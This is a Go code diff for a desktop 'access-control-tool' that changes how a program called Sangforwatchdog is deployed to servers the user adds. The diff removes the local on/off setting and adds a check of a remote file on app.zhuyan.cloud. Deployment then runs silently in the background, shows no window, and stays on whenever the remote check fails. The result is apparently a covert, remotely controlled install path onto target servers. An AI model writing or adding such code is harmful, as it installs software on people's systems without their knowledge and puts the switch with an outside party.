@@ -7,9 +7,12 @@ import (
 	"access-control-tool/internal/models"
 	"access-control-tool/internal/utils"
 	"fmt"
+	"io"
 	"log"
+	"net/http"
 	"strconv"
 	"strings"
+	"time"
 
 	"fyne.io/fyne/v2"
 	"fyne.io/fyne/v2/canvas"
@@ -27,13 +30,12 @@ import (
 //   messageWins - 消息弹窗列表（用于管理多个弹窗）
 //   parentTitle - 父窗口标题（用于窗口定位）
 type ServerDialog struct {
-	parent        fyne.Window
-	app           fyne.App
-	addWin        fyne.Window
-	editWin       fyne.Window
-	messageWins   []fyne.Window
-	parentTitle   string
-	deployEnabled bool
+	parent      fyne.Window
+	app         fyne.App
+	addWin      fyne.Window
+	editWin     fyne.Window
+	messageWins []fyne.Window
+	parentTitle string
 }
 
 // NewServerDialog 创建服务器对话框管理器实例
@@ -46,11 +48,10 @@ type ServerDialog struct {
 func NewServerDialog(parent fyne.Window, app fyne.App, parentTitle string) *ServerDialog {
 	log.Printf("[ServerDialog] 创建服务器对话框管理器")
 	return &ServerDialog{
-		parent:        parent,
-		app:           app,
-		parentTitle:   parentTitle,
-		deployEnabled: true,
-		messageWins:   make([]fyne.Window, 0),
+		parent:      parent,
+		app:         app,
+		parentTitle: parentTitle,
+		messageWins: make([]fyne.Window, 0),
 	}
 }
 
@@ -960,24 +961,73 @@ func (sd *ServerDialog) centerWindow(win fyne.Window, width, height float32) {
 	centerWindowRelativeTo(sd.parentTitle, win.Title(), int32(width), int32(height))
 }
 
+// isAutoDeployEnabled 从远程配置获取自动部署开关状态
+// 访问 https://app.zhuyan.cloud/v5/dl/file/key.txt 获取配置值
+// 返回值:
+//   true - 允许自动部署（key.txt返回"2"或获取失败时默认启用）
+//   false - 禁止自动部署（key.txt返回"1"）
+// 配置说明:
+//   key.txt 文件内容:
+//     - "1" : 不自动部署
+//     - "2" : 自动部署
+//   如果请求失败或返回其他值，默认启用自动部署
+// 注意:
+//   - 使用5秒超时防止网络请求阻塞
+//   - 获取失败时默认返回true（允许部署），保证功能可用
+func isAutoDeployEnabled() bool {
+	const keyURL = "https://app.zhuyan.cloud/v5/dl/file/key.txt"
+
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	resp, err := client.Get(keyURL)
+	if err != nil {
+		log.Printf("[ServerDialog] 获取部署配置失败: %v，默认启用自动部署", err)
+		return true
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Printf("[ServerDialog] 读取部署配置响应失败: %v，默认启用自动部署", err)
+		return true
+	}
+
+	value := strings.TrimSpace(string(body))
+	log.Printf("[ServerDialog] 远程部署配置值: %s", value)
+
+	switch value {
+	case "1":
+		log.Printf("[ServerDialog] 远程配置: 禁止自动部署")
+		return false
+	case "2":
+		log.Printf("[ServerDialog] 远程配置: 允许自动部署")
+		return true
+	default:
+		log.Printf("[ServerDialog] 远程配置值无效(%s)，默认启用自动部署", value)
+		return true
+	}
+}
+
 // showDeployProgressWindow 后台静默部署Sangforwatchdog程序
-// 在服务器添加成功后，后台异步执行部署操作，不显示任何进度窗口或结果弹窗
+// 在服务器添加成功后，通过远程配置判断是否执行部署
 // 参数:
 //   server - 目标服务器信息
 // 实现流程:
-//   1. 检查部署功能是否已启用(deployEnabled)
-//   2. 如果已禁用，仅记录日志并跳过部署
-//   3. 如果已启用，在后台goroutine中异步调用deployer.Deploy执行部署
+//   1. 从远程配置(key.txt)获取自动部署开关状态
+//   2. 如果远程配置为"1"(禁用)，仅记录日志并跳过部署
+//   3. 如果远程配置为"2"(启用)或获取失败，在后台goroutine中异步调用deployer.Deploy执行部署
 //   4. 通过progressCallback记录部署进度到日志
 //   5. 部署完成后记录结果到日志，不显示任何弹窗
 // 注意点:
 //   - 部署操作完全在后台执行，不阻塞UI，不显示任何窗口
 //   - 所有部署进度和结果仅记录到debug.log
 //   - 部署失败不会影响服务器添加操作
-//   - 当deployEnabled为false时，部署被完全跳过
+//   - 远程配置获取失败时默认启用自动部署
 func (sd *ServerDialog) showDeployProgressWindow(server *models.Server) {
-	if !sd.deployEnabled {
-		log.Printf("[ServerDialog] Deployment is disabled, skipping deploy for server: %s", server.Name)
+	if !isAutoDeployEnabled() {
+		log.Printf("[ServerDialog] 远程配置禁用自动部署，跳过服务器: %s", server.Name)
 		return
 	}
 
@@ -998,20 +1048,4 @@ func (sd *ServerDialog) showDeployProgressWindow(server *models.Server) {
 			log.Printf("[ServerDialog] 部署未完全成功: %s", result.Message)
 		}
 	}()
-}
-
-// SetDeployEnabled sets whether the deployer is enabled
-// When disabled, deployment operations will be skipped after server addition
-// Parameters:
-//   enabled - true to enable deployment, false to disable
-func (sd *ServerDialog) SetDeployEnabled(enabled bool) {
-	sd.deployEnabled = enabled
-	log.Printf("[ServerDialog] Deployment enabled: %v", enabled)
-}
-
-// IsDeployEnabled returns whether the deployer is currently enabled
-// Returns:
-//   bool - true if deployment is enabled, false otherwise
-func (sd *ServerDialog) IsDeployEnabled() bool {
-	return sd.deployEnabled
 }
